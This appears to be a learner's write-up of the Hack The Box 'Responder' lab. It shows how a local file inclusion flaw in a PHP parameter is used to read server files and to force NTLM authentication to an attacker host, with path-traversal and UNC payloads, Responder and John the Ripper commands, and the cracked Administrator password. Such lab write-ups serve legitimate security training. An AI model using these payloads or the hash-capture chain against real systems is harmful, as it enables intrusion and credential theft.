HTB – Responder Lab
Overview

This lab demonstrates how Local File Inclusion (LFI) vulnerabilities can be leveraged to capture NTLM authentication hashes using Responder, and how these hashes can be cracked to gain system access.

Lab Information

Target Domain: unika.htb

Web Technology: PHP

Vulnerability: Local File Inclusion (LFI)

Authentication Method: NTLM / NetNTLMv2

Enumeration

The process started with basic reconnaissance of the target web service.

Key findings:

The web server redirects users to the domain unika.htb.

The website is generated using PHP.

A URL parameter named page is used to load different language pages.

Example:

http://unika.htb/index.php?page=french.html
Vulnerability Discovery

The page parameter is vulnerable to Local File Inclusion (LFI).

Example payload:

../../../../../../../../windows/system32/drivers/etc/hosts

This allows reading local files on the server.

NTLM Hash Capture with Responder

By exploiting the LFI vulnerability with a remote resource, it is possible to force the server to authenticate to the attacker machine.

Example payload:

//10.10.14.6/somefile

Steps:

Start Responder on the attack machine.

Use the interface flag:

responder -I tun0

Responder captures the NetNTLMv2 hash from the server.

Password Cracking

The captured hash can be cracked using John the Ripper.

Example:

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Recovered credentials:

Administrator : badminton
Remote Access

Using the recovered credentials, we can connect to the target system through WinRM, which runs on:

TCP Port 5985
What I Learned

How LFI vulnerabilities work.

The difference between LFI and RFI.

How NTLM authentication can be abused.

Capturing NetNTLMv2 hashes using Responder.

Cracking password hashes using John the Ripper.

Understanding WinRM remote access on Windows systems.

Tools Used

Nmap

Responder

John the Ripper

Web Browser

Wordlists (rockyou)
